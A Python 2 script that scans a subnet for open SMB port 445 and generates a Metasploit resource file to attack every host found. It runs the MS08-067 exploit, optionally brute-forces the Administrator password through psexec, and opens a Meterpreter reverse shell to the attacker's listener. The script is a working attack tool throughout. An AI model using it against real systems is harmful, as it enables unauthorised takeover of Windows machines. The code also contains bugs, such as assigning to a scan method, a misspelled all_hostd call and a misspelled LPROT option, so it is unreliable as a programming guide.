import nmap
import os
import optparse
import sys


def findTgts(subNet):
    nmScan = nmap.PortScanner()
    nmScan.scan = (subNet, '445')
    tgtHosts = []
    for host in nmScan.all_hostd():
        if nmScan[host].has_tcp(445):
            state = nmScan[host]['tcp'][445]['state']
            if state == 'open':
                print '[+] Found Target Host: ' + host
                tgtHosts.append(host)
    return tgtHosts


def setupHandler(configFile, lhost, lport):
    configFile.write('use exploit/multi/handler\n')
    configFile.write('set PAYLOAD windows/meterpreter/reverse_tcp\n')
    configFile.write('set LPROT ' + str(lport) + '\n')
    configFile.write('set LHOST ' + lhost + '\n')
    configFile.write('exploit -j -z\n')
    configFile.write('setg DisablePayloadHandler 1\n')


def conflickerExploit(configFile, tgtHost, lhost, lport):
    configFile.write('use exploit/windows/smb/ms08_067_netapi\n')
    configFile.write('set RHOST ' + str(tgtHost) + '\n')
    configFile.write('set PAYLOAD windows/meterpreter/reverse_tcp\n')
    configFile.write('set LPROT ' + str(lport) + '\n')
    configFile.write('set LHOST ' + lhost + '\n')
    configFile.write('exploit -j -z\n')


def smbBrute(configFile, tgtHost, passwdFile, lhost, lport):
    username = 'Administrator'
    pF = open(passwdFile, 'r')
    for password in pF.readlines():
        password = password.strip('\n').strip('\r')
        configFile.write('use exploit/windows/smb/psexec\n')
        configFile.write('set SMBUser ' + str(username) + '\n')
        configFile.write('set SMBPass ' + str(password) + '\n')
        configFile.write('set RHOST ' + str(tgtHost) + '\n')
        configFile.write('set PAYLOAD windows/meterpreter/reverse_tcp\n')
        configFile.write('set LPROT ' + str(lport) + '\n')
        configFile.write('set LHOST ' + lhost + '\n')
        configFile.write('exploit -j -z\n')


def main():
    configFile = open('meta.rc', 'w')
    parser = optparse.OptionParser('[-] Usage%prog ' + '-H <RHOST[s]> -l <LHOST> [-p <LPORT> -F <Password Files]')
    parser.add_option('-H', dest='tgtHost', type='string', help='specify the target address[es]')
    parser.add_option('-p', dest='lport', type='string', help='specify the listen port')
    parser.add_option('-l', dest='lhost', type='string', help='specify the listen address')
    parser.add_option('-F', dest='passwdFile', type='string', help='password file for SMB brute force attempt')
    (options, args) = parser.parse_args()
    if (options.tgtHost is None) | (options.lhost is None):
        print parser.usage
        exit(0)
    lhost = options.lhost
    lport = options.lport
    if lport is None:
        lport = '1337'
    passwdFile = options.passwdFile
    tgtHosts = findTgts(options.tgtHost)
    setupHandler(configFile, lhost, lport)
    for tgtHost in tgtHosts:
        conflickerExploit(configFile, tgtHost, lhost, lport)
        if passwdFile is not None:
            smbBrute(configFile, tgtHost, passwdFile, lhost, lport)
    configFile.close()
    os.system('msfconsole -r meta.rc')

if __name__ == '__main__':
    main()
